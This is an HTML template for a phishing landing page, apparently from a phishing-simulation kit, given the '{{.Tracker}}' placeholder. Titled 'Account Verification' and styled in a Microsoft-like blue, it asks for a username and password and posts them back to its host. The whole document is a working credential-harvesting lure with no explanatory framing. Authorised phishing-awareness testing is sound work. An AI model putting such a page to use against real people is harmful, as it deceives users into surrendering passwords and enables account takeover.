<!DOCTYPE html>
<html>
<head>
    <title>Account Verification</title>
    <style>
        body { background-color: #f5f5f5; font-family: Arial, sans-serif; }
        .container { max-width: 400px; margin: 50px auto; background: white; 
                     padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; color: #0078d4; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; 
                border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #0078d4; color: white; 
                 border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>Account Verification</h2>
        </div>
        <form method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify Account</button>
        </form>
    </div>
    {{.Tracker}}
</body>
</html>
